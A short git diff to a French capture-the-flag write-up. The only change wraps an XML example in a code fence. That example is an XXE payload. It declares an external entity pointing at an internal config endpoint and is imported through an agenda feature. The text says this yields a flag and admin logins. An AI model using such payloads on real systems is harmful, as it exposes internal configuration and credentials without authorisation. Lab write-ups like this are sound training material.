@@ -15,6 +15,7 @@ cet indice nous fait comprendre qu'il faut faire une injection XML dans l'agenda
 ![XML](Resources/XML2.png)
 
 EXEMPLE DE SCRIPT :
+```xml
     <?xml version="1.0"?>
     <!DOCTYPE agenda [
     <!ENTITY xxe SYSTEM "http://localhost:4942/internal/config">
@@ -25,7 +26,7 @@ EXEMPLE DE SCRIPT :
         <date>2042-01-15</date>
     </event>
     </agenda>
-
+```
 
 apres avoir importe le fichier, on obtient le nouveau flag ainsi que des login admin qui va nous servir juste apres
 
